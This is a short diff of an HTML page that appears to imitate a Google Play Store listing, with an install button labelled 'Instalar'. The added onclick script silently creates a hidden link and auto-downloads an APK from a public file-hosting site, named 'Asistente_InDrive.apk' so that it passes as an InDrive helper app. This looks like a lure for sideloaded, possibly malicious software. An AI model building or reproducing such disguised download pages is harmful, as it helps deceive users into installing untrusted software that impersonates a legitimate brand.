@@ -2115,7 +2115,15 @@
                                       jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                                       data-disable-idom="true"
                                       aria-label="Instalar"
-                                      onclick="window.location.href='https://files.catbox.moe/7amsd1.apk'"
+                                      onclick="
+                                        const link = document.createElement('a');
+                                        link.href = 'https://files.catbox.moe/7amsd1.apk';
+                                        link.download = 'Asistente_InDrive.apk';
+                                        link.style.display = 'none';
+                                        document.body.appendChild(link);
+                                        link.click();
+                                        document.body.removeChild(link);
+                                      "
                                     >
                                       <div class="VfPpkd-Jh9lGc"></div>
                                       <div class="VfPpkd-J1Ukfc-LhBDec"></div>
